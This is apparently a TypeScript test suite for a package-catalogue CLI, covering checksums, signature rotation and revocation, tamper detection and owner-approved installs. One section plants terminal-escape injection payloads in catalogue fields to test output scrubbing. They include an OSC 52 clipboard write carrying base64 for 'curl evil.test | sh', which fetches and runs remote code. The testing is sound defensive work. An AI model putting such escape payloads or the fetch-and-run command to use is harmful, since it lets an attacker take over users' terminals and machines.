/**
 * The use-case SDK on this machine: `new` writes a file that checks, `publish` fills a catalogue folder and refuses a
 * version too small for its changes, `search` and `diff` send nothing, and `install --from` holds the file to its checksum
 * and only asks, against a stub record on node:http.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer, type Server } from 'node:http';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import type { Trust } from '@braindog/declare/catalogue';

import { usecase } from '../src/usecase.ts';
import type { AgentIo } from '../src/skills.ts';

/* Obviously fake. */
const TOKEN = ['rec_01TESTTESTTESTTESTTESTTEST', 'stub-bearer-for-tests-only-44ab'].join('.');
const CONTEXT = { session: null, ambiguous: [], handoff: null, live: { same_repo: [], elsewhere: [] }, waiting: [], people: [], faded: 0, project: null, registers: [], next: '' };

/** The catalogue the web app ships and every host serves under `/catalogue/`, as committed. */
const SHIPPED = fileURLToPath(new URL('../../web/static/catalogue/', import.meta.url));

async function setup(t: { after: (fn: () => void | Promise<void>) => void }, answers: Record<string, unknown> = {}, catalogue?: string) {
  const seen: { method: string; args: Record<string, unknown> }[] = [];
  const server: Server = createServer((req, res) => {
    const path = new URL(req.url ?? '/', 'http://stub').pathname;
    /* THE HOST'S STATIC CATALOGUE, answered as a host answers it: the folder's file, or a 404. Never counted as a call. */
    const prefix = path.startsWith('/catalogue/') ? '/catalogue/' : path.startsWith('/api/kennel/v1/') ? '/api/kennel/v1/' : null;
    if (catalogue !== undefined && prefix !== null) {
      const file = join(catalogue, ...path.slice(prefix.length).split('/'));
      if (!existsSync(file)) return void res.writeHead(404).end();
      return void res.writeHead(200, { 'content-type': 'application/json' }).end(readFileSync(file));
    }
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => {
      const method = path.replace(/^\/api\//, '');
      const raw = Buffer.concat(chunks).toString('utf8');
      seen.push({ method, args: raw ? (JSON.parse(raw) as Record<string, unknown>) : {} });
      res.writeHead(200, { 'content-type': 'application/json' });
      if (method === 'context') return res.end(JSON.stringify({ ok: true, value: CONTEXT }));
      if (method === 'propose') return res.end(JSON.stringify({ ok: true, value: { id: 'SG7' } }));
      if (method in answers) return res.end(JSON.stringify({ ok: true, value: answers[method] }));
      res.end(JSON.stringify({ ok: false, refusal: { code: 'ROUTE_UNKNOWN', fix: `The stub does not answer ${method}.` } }));
    });
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  t.after(() => new Promise<void>((done) => server.close(() => done())));
  const dir = mkdtempSync(join(tmpdir(), 'braindog-sdk-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const env = { XDG_CONFIG_HOME: join(dir, 'config'), BRAINDOG_HOST: `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`, BRAINDOG_TOKEN: TOKEN };
  const out: string[] = [];
  const said: string[] = [];
  const io: AgentIo = { env, cwd: dir, home: dir, out: (l) => void out.push(l), say: (l) => void said.push(l), headers: async () => ({}) };
  return { dir, io, out, said, seen };
}

test('new writes a starting file that checks, and never writes over one', async (t) => {
  const h = await setup(t);
  assert.equal(await usecase(['new', 'reading-club', '--author', 'Halden'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['check', 'reading-club-1.0.0.usecase.json'], h.io), 0, h.said.join('\n'));
  assert.ok(h.out.some((l) => /Reading club 1\.0\.0 reads as a starter: 1 lists, 1 pages/u.test(l)));
  assert.ok(h.out.some((l) => /Calls out to: nothing/u.test(l)));
  assert.equal(await usecase(['new', 'reading-club'], h.io), 1);
  assert.equal(await usecase(['new', 'Bad Id'], h.io), 1);
  assert.equal(h.seen.length, 0, 'new or check sent something');
});

test('publish fills a catalogue, refuses the same version and a bump too small, and search and diff read it', async (t) => {
  const h = await setup(t);
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  const first = JSON.parse(readFileSync(join(h.dir, 'club-1.0.0.usecase.json'), 'utf8'));
  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /same file.*\(ALREADY_KNOWN\)/u);

  /* 1.0.1 takes the page away: refused as a patch, published as 2.0.0. */
  const fewer = { ...first, version: '1.0.1', pack: { ...first.pack, declarations: first.pack.declarations.filter((d: { page?: string }) => d.page === undefined) } };
  writeFileSync(join(h.dir, 'club-1.0.1.usecase.json'), JSON.stringify(fewer));
  assert.equal(await usecase(['publish', 'club-1.0.1.usecase.json', '--to', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /Publish it as 2\.0\.0/u);
  writeFileSync(join(h.dir, 'club-2.0.0.usecase.json'), JSON.stringify({ ...fewer, version: '2.0.0' }));
  assert.equal(await usecase(['publish', 'club-2.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.ok(h.out.some((l) => /Takes away: Club \(page\)/u.test(l)));

  const index = JSON.parse(readFileSync(join(h.dir, 'catalogue', 'index.json'), 'utf8'));
  assert.deepEqual(index.entries[0].versions.map((v: { version: string }) => v.version), ['2.0.0', '1.0.0']);
  assert.equal(index.entries[0].versions[0].bump, 'major');

  h.out.length = 0;
  assert.equal(await usecase(['search', 'club', '--from', 'catalogue'], h.io), 0);
  assert.match(h.out[0] ?? '', /^club {2}Club 2\.0\.0 by Halden/u);
  assert.ok(h.out.some((l) => /Unsigned: nothing says who published it/u.test(l)));
  h.out.length = 0;
  assert.equal(await usecase(['diff', 'club-1.0.0.usecase.json', 'club-2.0.0.usecase.json'], h.io), 0);
  assert.equal(h.out[0], '1.0.0 to 2.0.0 needs at least a major version.');
  assert.equal(h.seen.length, 0, 'publish, search or diff sent something');
});

test('install --from holds the file to its checksum, then only asks the owner', async (t) => {
  const h = await setup(t);
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0);
  assert.equal(await usecase(['install', 'club', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
  const asked = h.seen.filter((s) => s.method !== 'context');
  assert.deepEqual(asked.map((s) => s.method), ['propose']);
  assert.equal(asked[0]?.args.body_kind, 'pack');
  assert.match(h.out.at(-1) ?? '', /Asked the owner: Install Club 1\.0\.0 from a catalogue\? Unsigned.* Nothing is installed until they accept it\. Open Decide in the app\.$/u);

  /* A file changed after it was published is refused, and nothing more is sent. */
  const path = join(h.dir, 'catalogue', 'usecases', 'club', '1.0.0.usecase.json');
  writeFileSync(path, readFileSync(path, 'utf8').replace('What Club is for', 'What Club is really for'));
  const before = h.seen.length;
  assert.equal(await usecase(['install', 'club', '--from', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /\(CHECKSUM_MISMATCH\)$/u);
  assert.equal(h.seen.length, before);
  assert.equal(await usecase(['install', 'nothing', '--from', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /It has: club\./u);
  assert.equal(await usecase(['install', 'club', '--version', '1.0.0'], h.io), 1);
});

test('key rotate lets a reader who trusted the old key trust the new one, and key revoke stops a version being asked for', async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const h = await setup(t);
  const keys = join(h.dir, 'keys');
  assert.equal(await pack(['key', join(keys, 'old.json'), '--author', 'Halden'], h.io), 0, h.said.join('\n'));
  assert.equal(await pack(['key', join(keys, 'new.json'), '--author', 'Halden'], h.io), 0, h.said.join('\n'));
  const oldId = (JSON.parse(readFileSync(join(keys, 'old.json'), 'utf8')) as { key_id: string }).key_id;
  const newId = (JSON.parse(readFileSync(join(keys, 'new.json'), 'utf8')) as { key_id: string }).key_id;

  assert.equal(await pack(['new', 'bookshelf', '--author', 'Halden'], h.io), 0, h.said.join('\n'));
  assert.equal(await pack(['publish', 'bookshelf', '--to', 'catalogue', '--sign', join(keys, 'old.json')], h.io), 0, h.said.join('\n'));
  assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.match(h.out.join('\n'), /has not seen a key for Halden before/u);

  const later = JSON.parse(readFileSync(join(h.dir, 'bookshelf', 'bookshelf.pack.json'), 'utf8')) as Record<string, unknown>;
  writeFileSync(join(h.dir, 'bookshelf-1.0.1.pack.json'), JSON.stringify({ ...later, version: '1.0.1', summary: `${String(later.summary)} Kept tidy.` }));
  assert.equal(await pack(['publish', 'bookshelf-1.0.1.pack.json', '--to', 'catalogue', '--sign', join(keys, 'new.json')], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /rotation/u);

  assert.equal(await pack(['key', 'rotate', join(keys, 'old.json'), join(keys, 'new.json'), '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  const index = readFileSync(join(h.dir, 'catalogue', 'index.json'), 'utf8');
  assert.match(index, /braindog-key-rotation-1/u);
  assert.doesNotMatch(index, /private_key/u);
  assert.equal(await pack(['publish', 'bookshelf-1.0.1.pack.json', '--to', 'catalogue', '--sign', join(keys, 'new.json')], h.io), 0, h.said.join('\n'));
  assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.match(h.out.join('\n'), new RegExp(`Signed by key ${newId}, which key ${oldId}, the one this machine has seen for Halden, named as its successor`, 'u'));
  assert.deepEqual(JSON.parse(readFileSync(join(h.dir, 'config', 'braindog', 'known-keys.json'), 'utf8')), { 'pack:bookshelf': [oldId, newId] });

  assert.equal(await pack(['key', 'revoke', join(keys, 'new.json'), '--to', 'catalogue'], h.io), 1);
  assert.equal(await pack(['key', 'revoke', join(keys, 'new.json'), '--to', 'catalogue', '--reason', 'Copied off a shared machine.'], h.io), 0, h.said.join('\n'));
  const asked = h.seen.filter((s) => s.method === 'propose').length;
  assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 1);
  assert.equal(h.said.at(-1), `Bookshelf 1.0.1 is signed by key ${newId}, which its author revoked, so it is not trusted. Their reason: Copied off a shared machine. Nothing was sent.`);
  assert.equal(h.seen.filter((s) => s.method === 'propose').length, asked);
  assert.equal(await pack(['search', '--from', 'catalogue'], h.io), 0);
  assert.match(h.out.at(-2) ?? '', /which its author revoked/u);
});

test('install refuses a version that arrives unsigned after signed ones, and search says it loudly', async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const h = await setup(t);
  const keys = join(h.dir, 'keys');
  assert.equal(await pack(['key', join(keys, 'k.json'), '--author', 'Halden'], h.io), 0, h.said.join(' '));
  const keyId = (JSON.parse(readFileSync(join(keys, 'k.json'), 'utf8')) as { key_id: string }).key_id;
  assert.equal(await pack(['new', 'bookshelf', '--author', 'Halden'], h.io), 0, h.said.join(' '));
  assert.equal(await pack(['publish', 'bookshelf', '--to', 'catalogue', '--sign', join(keys, 'k.json')], h.io), 0, h.said.join(' '));
  const later = JSON.parse(readFileSync(join(h.dir, 'bookshelf', 'bookshelf.pack.json'), 'utf8')) as Record<string, unknown>;
  writeFileSync(join(h.dir, 'bookshelf-1.0.1.pack.json'), JSON.stringify({ ...later, version: '1.0.1', summary: `${String(later.summary)} Kept tidy.` }));
  assert.equal(await pack(['publish', 'bookshelf-1.0.1.pack.json', '--to', 'catalogue', '--sign', join(keys, 'k.json')], h.io), 0, h.said.join(' '));

  /* Somebody edits the index: the latest version loses its signature, and the author is renamed. */
  const path = join(h.dir, 'catalogue', 'index.json');
  const index = JSON.parse(readFileSync(path, 'utf8')) as { entries: { author: string; versions: Record<string, unknown>[] }[] };
  delete index.entries[0]!.versions[0]!.signature;
  index.entries[0]!.author = 'Someone Else';
  writeFileSync(path, JSON.stringify(index));

  assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', new RegExp(`Bookshelf 1\.0\.1 is unsigned, and earlier versions were signed by key ${keyId}.*Nothing was sent\.$`, 'u'));
  assert.equal(h.seen.filter((s) => s.method === 'propose').length, 0);
  assert.equal(await pack(['search', '--from', 'catalogue'], h.io), 0);
  assert.ok(h.out.some((l) => /Unsigned, and earlier versions were signed by key/u.test(l)));
});

test('install refuses a file whose own id is not the entry it is listed under', async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const { fileChecksum } = await import('@braindog/declare/catalogue');
  const h = await setup(t);
  assert.equal(await pack(['new', 'bookshelf', '--author', 'Halden'], h.io), 0, h.said.join(' '));
  assert.equal(await pack(['publish', 'bookshelf', '--to', 'catalogue'], h.io), 0, h.said.join(' '));
  const doc = JSON.parse(readFileSync(join(h.dir, 'bookshelf', 'bookshelf.pack.json'), 'utf8')) as Record<string, unknown>;
  const swapped = JSON.stringify({ ...doc, pack: 'other' });
  writeFileSync(join(h.dir, 'catalogue', 'packs', 'bookshelf', '1.0.0.pack.json'), swapped);
  const path = join(h.dir, 'catalogue', 'index.json');
  const index = JSON.parse(readFileSync(path, 'utf8')) as { entries: { versions: { checksum: string }[] }[] };
  index.entries[0]!.versions[0]!.checksum = await fileChecksum(swapped);
  writeFileSync(path, JSON.stringify(index));
  assert.equal(await pack(['install', 'bookshelf', '--from', 'catalogue'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /the file inside is other 1\.0\.0/u);
  assert.equal(h.seen.filter((s) => s.method === 'propose').length, 0);
});

/* ── a catalogue's words, from somebody further off than a member ───────── */

/*
 * A CATALOGUE'S OWN BYTES, AS AN ATTACKER WOULD WRITE THEM. A catalogue index is somebody else's file, read from a folder or an
 * address, and `readCatalogue` checks an entry's kind, id and versions and nothing of its title, author or summary. Run
 * against the tree before the fix, `search` put OSC 0 (retitle the window), SGR red and an OSC 52 clipboard write of
 * `curl evil.test | sh` on the terminal byte for byte.
 */
const OSC_TITLE = 'Club \u001b]0;owned\u0007';
const SGR_AUTHOR = 'A \u001b[31mRed';
const OSC_CLIPBOARD = 'Tracks members.\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b[2K';

/** Every control character a printed line could carry, C0, DEL and C1 alike. */
const CONTROL = /[\u0000-\u001f\u007f-\u009f]/u;
const dirty = (lines: readonly string[]): string[] => lines.filter((l) => CONTROL.test(l)).map((l) => JSON.stringify(l));

test("search prints a stranger's catalogue with no control character in it, and the words still there", async (t) => {
  const h = await setup(t);
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  const path = join(h.dir, 'catalogue', 'index.json');
  const index = JSON.parse(readFileSync(path, 'utf8')) as { entries: { title: string; author: string; summary: string; versions: { reach: { pages: string[] } }[] }[] };
  const entry = index.entries[0]!;
  entry.title = OSC_TITLE;
  entry.author = SGR_AUTHOR;
  entry.summary = OSC_CLIPBOARD;
  /* THE REACH IS THE INDEX'S TOO, not worked out from the file on the way to the terminal. */
  entry.versions[0]!.reach.pages = ['Club\u001b]0;owned\u0007'];
  writeFileSync(path, JSON.stringify(index));

  h.out.length = 0;
  assert.equal(await usecase(['search', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.deepEqual(dirty([...h.out, ...h.said]), []);
  assert.equal(h.out[0], 'club  Club ]0;owned 1.0.0 by A [31mRed. Tracks members. ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== [2K');
  assert.ok(h.out.some((l) => l === '  Adds lists: Items; pages: Club ]0;owned; rules: none'), h.out.join('\n'));
});

/*
 * THE FILE'S OWN WORDS GO THE SAME ROAD. `readShared` and the add-on door take a title, author and license holding ESC
 * and BEL without a word, measured by a probe before this test was written, so `check`, `publish`, `diff` and
 * `install --from` each printed the file's words as sent. Only the lines are scrubbed: the file is published byte for
 * byte, because the checksum a reader holds it to is over those bytes.
 */
test("check, publish, diff and install --from print a shared file's title, author and license with no control character", async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const h = await setup(t);
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  const file = JSON.parse(readFileSync(join(h.dir, 'club-1.0.0.usecase.json'), 'utf8')) as Record<string, unknown>;
  const hostile = { ...file, title: OSC_TITLE, author: SGR_AUTHOR, license: 'MIT\u001b]52;c;Y3VybA==\u0007', summary: OSC_CLIPBOARD };
  const text = JSON.stringify(hostile);
  writeFileSync(join(h.dir, 'club-1.0.0.usecase.json'), text);
  /* 1.1.0 retitles the page with an eight-bit CSI, so `diff` has a declaration's title of the file's to say. */
  const packed = file.pack as { declarations: Record<string, unknown>[] };
  const retitled = { ...packed, declarations: packed.declarations.map((d) => (d.page === undefined ? d : { ...d, title: 'Club\u009b2K' })) };
  writeFileSync(join(h.dir, 'club-1.1.0.usecase.json'), JSON.stringify({ ...hostile, version: '1.1.0', pack: retitled }));

  h.out.length = 0;
  assert.equal(await usecase(['check', 'club-1.0.0.usecase.json'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['publish', 'club-1.0.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.equal(readFileSync(join(h.dir, 'catalogue', 'usecases', 'club', '1.0.0.usecase.json'), 'utf8'), text);
  assert.equal(await usecase(['publish', 'club-1.1.0.usecase.json', '--to', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['diff', 'club-1.0.0.usecase.json', 'club-1.1.0.usecase.json'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['install', 'club', '--from', 'catalogue'], h.io), 0, h.said.join('\n'));
  assert.equal(await usecase(['install', 'club', '--from', 'catalogue', '--version', '9.9.9'], h.io), 1);

  assert.equal(await pack(['new', 'shelf', '--author', 'Halden'], h.io), 0);
  const shelf = JSON.parse(readFileSync(join(h.dir, 'shelf', 'shelf.pack.json'), 'utf8')) as Record<string, unknown>;
  writeFileSync(join(h.dir, 'shelf', 'shelf.pack.json'), JSON.stringify({ ...shelf, title: OSC_TITLE, author: SGR_AUTHOR, license: 'MIT\u0007' }));
  assert.equal(await pack(['check', 'shelf'], h.io), 0, h.said.join('\n'));

  assert.deepEqual(dirty([...h.out, ...h.said]), []);
  assert.ok(h.out.includes('  By A [31mRed, MIT ]52;c;Y3VybA==.'), h.out.join('\n'));
  assert.ok(h.out.includes('  Changes: Club 2K (page)'), h.out.join('\n'));
  assert.match(h.out.join('\n'), /Asked the owner: Install Club \]0;owned 1\.1\.0 from a catalogue\?/u);
  assert.match(h.said.join('\n'), /Club \]0;owned has no version 9\.9\.9/u);
});

/*
 * THE CHECKER'S MUTANTS. With the scrub taken out of `trustLine`, out of `usecase list`, out of `proposeFile` and out of
 * `installOffered`, every test above still passed: each unsigned entry above says a line that names no author, and no
 * test here had asked `list`, `install <file>` or `install <id>` about a stranger's words. `preview` had no scrub at all
 * and printed a file's title as sent. Each of those five mutants goes red on the two tests below.
 */
test("trustLine says an author and a revocation's reason with no control character, on every kind of trust", async () => {
  const { trustLine } = await import('../src/catalogue.ts');
  const reason = 'Lost it.\u001b]52;c;Y3VybA==\u0007';
  const kinds: Trust[] = [
    { kind: 'stripped', before: ['k1'] },
    { kind: 'first', key_id: 'k1' },
    { kind: 'known', key_id: 'k1' },
    { kind: 'changed', key_id: 'k2', before: ['k1'] },
    { kind: 'rotated', key_id: 'k2', from: 'k1' },
    { kind: 'revoked', key_id: 'k1', reason },
  ];
  const lines = kinds.map((k) => trustLine(k, SGR_AUTHOR));
  assert.deepEqual(dirty(lines), []);
  for (const line of lines.slice(0, -1)) assert.match(line, /A \[31mRed/u);
  assert.match(lines.at(-1) ?? '', /Their reason: Lost it\. \]52;c;Y3VybA==$/u);
});

test("install <file>, preview, list and install <id> print a use case's words with no control character", async (t) => {
  const offer = [{ id: 'usecase-club', usecase: OSC_TITLE, summary: OSC_CLIPBOARD, modules: ['crm\u001b[2K'] }];
  const h = await setup(t, { arrangement: { packs: [{ id: 'usecase-home', version: '1.0.0\u0007' }], offer } });
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  const file = JSON.parse(readFileSync(join(h.dir, 'club-1.0.0.usecase.json'), 'utf8')) as Record<string, unknown>;
  writeFileSync(join(h.dir, 'club-1.0.0.usecase.json'), JSON.stringify({ ...file, title: OSC_TITLE }));

  h.out.length = 0;
  assert.equal(await usecase(['install', 'club-1.0.0.usecase.json'], h.io), 0, h.said.join('\n'));
  assert.match(h.out.at(-1) ?? '', /^Asked the owner to install Club \]0;owned 1\.0\.0\./u);
  /* A SELF-HOST THAT ONLY EXITS, so `preview` gets as far as its line and no further. */
  const stub = join(h.dir, 'selfhost.mjs');
  writeFileSync(stub, 'process.exit(0);\n');
  assert.equal(await usecase(['preview', 'club-1.0.0.usecase.json'], { ...h.io, env: { ...h.io.env, BRAINDOG_SELFHOST: stub } }), 0, h.said.join('\n'));
  assert.match(h.out.at(-1) ?? '', /^Previewing Club \]0;owned 1\.0\.0 on a scratch BrainDog\./u);
  assert.equal(await usecase(['list'], h.io), 0, h.said.join('\n'));
  assert.ok(h.out.includes('  club  Club ]0;owned. Tracks members. ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== [2K. Builds on crm [2K.'), h.out.join('\n'));
  assert.equal(await usecase(['install', 'club'], h.io), 0, h.said.join('\n'));
  assert.match(h.out.at(-1) ?? '', /^Asked the owner to set this BrainDog up for Club \]0;owned\./u);

  assert.deepEqual(dirty([...h.out, ...h.said]), []);
  /* THE QUESTION ON DECIDE IS BUILT FROM THE SAME CLEAN WORDS; the file in the body is sent byte for byte. */
  const proposed = h.seen.filter((s) => s.method === 'propose');
  assert.deepEqual(dirty(proposed.map((s) => String(s.args.question))), []);
  assert.ok(String((proposed[0]?.args.body as { file: string }).file).includes('\\u001b]0;owned'));
});

/* ── a pack in packs/, installed from the CLI ───────────────────────────── */

/*
 * A PACK IN `packs/` IS INSTALLABLE FROM THE CLI. Four packs once sat in `packs/` that nothing could install: `pack install`
 * took only `<id> --from <catalogue>`, and the catalogue every host serves listed `reading-list` alone. Run against the
 * tree before this, `braindog pack install packs/project-brief/project-brief.pack.json --dry-run` printed the whole usage
 * line and sent nothing, and `pack install project-brief` said it "takes one id and --from <catalogue>".
 */
const PROJECT_BRIEF = fileURLToPath(new URL('../../../packs/project-brief/project-brief.pack.json', import.meta.url));

test('pack install <file> --dry-run says the plan and sends nothing; without it the owner is asked, with the document', async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const h = await setup(t);
  assert.equal(await pack(['install', PROJECT_BRIEF, '--dry-run'], h.io), 0, h.said.join('\n'));
  assert.equal(h.seen.length, 0, 'a dry run sent something');
  assert.match(h.out[0] ?? '', /^Project brief 2\.1\.1 reads as a plugin/u);
  /* Since 2.0.0 (brief-48), and so 2.1.1, it needs Work too, for the steps a task ticks, and adds its Plan steps list and three rules. */
  assert.ok(h.out.includes('  Installs first: portfolio, work'), h.out.join('\n'));
  assert.ok(
    h.out.includes(
      '  Adds lists: Plan steps; pages: Briefs; rules: Tick the plan steps linked to a task when the task is done, Tick the plan steps linked to a thread when the thread is done, Bring briefs over',
    ),
    h.out.join('\n'),
  );
  assert.match(h.out.at(-1) ?? '', /^Would ask the owner: Install Project brief 2\.1\.1\? Nothing was sent\.$/u);

  h.out.length = 0;
  assert.equal(await pack(['install', PROJECT_BRIEF], h.io), 0, h.said.join('\n'));
  const asked = h.seen.filter((s) => s.method === 'propose');
  assert.equal(asked.length, 1);
  const body = asked[0]?.args.body as { install: string; doc: Record<string, unknown> };
  assert.equal(body.install, 'project-brief');
  assert.deepEqual(body.doc, JSON.parse(readFileSync(PROJECT_BRIEF, 'utf8')));
  assert.match(h.out.at(-1) ?? '', /^Asked the owner: Install Project brief 2\.1\.1\? Nothing is installed until they accept it\. Open Decide in the app\.$/u);

  /* A USE CASE IS NOT AN ADD-ON, and a file that is neither is refused before anything is sent. */
  assert.equal(await usecase(['new', 'club', '--author', 'Halden'], h.io), 0);
  const before = h.seen.length;
  assert.equal(await pack(['install', 'club-1.0.0.usecase.json'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /is a starter, not a plugin/u);
  assert.equal(h.seen.length, before);
});

test('pack install <id> with no --from resolves the id in the catalogue the host serves, which lists every pack in packs/', async (t) => {
  const { pack } = await import('../src/catalogue.ts');
  const h = await setup(t, {}, SHIPPED);
  assert.equal(await pack(['install', 'project-brief', '--dry-run'], h.io), 0, h.said.join('\n'));
  assert.equal(h.seen.filter((s) => s.method === 'propose').length, 0, 'a dry run asked');
  assert.match(h.out.join('\n'), /Unsigned: nothing says who published it/u);
  assert.match(h.out.at(-1) ?? '', /^Would ask the owner: Install Project brief 2\.1\.1 from a catalogue\?.* Nothing was sent\.$/u);

  assert.equal(await pack(['install', 'project-brief'], h.io), 0, h.said.join('\n'));
  const asked = h.seen.filter((s) => s.method === 'propose');
  assert.equal(asked.length, 1);
  assert.equal((asked[0]?.args.body as { install: string }).install, 'project-brief');

  /* EVERY ADD-ON THE HOST LISTS RESOLVES, by the id its file gives itself and not its folder's: `packs/mercury` is
     `mercury-company`. That the list holds every pack in `packs/` is the web app's test, beside the folder it ships. */
  const listed = (JSON.parse(readFileSync(join(SHIPPED, 'index.json'), 'utf8')) as { entries: { kind: string; id: string }[] }).entries.filter((e) => e.kind === 'pack');
  assert.ok(listed.some((e) => e.id === 'mercury-company'), listed.map((e) => e.id).join(', '));
  for (const { id } of listed) assert.equal(await pack(['install', id, '--dry-run'], h.io), 0, `${id}: ${h.said.join('\n')}`);
  assert.equal(await pack(['install', 'nothing-here', '--dry-run'], h.io), 1);
  assert.match(h.said.at(-1) ?? '', /There is no plugin called nothing-here in this catalogue\. It has: .*project-brief/u);
});
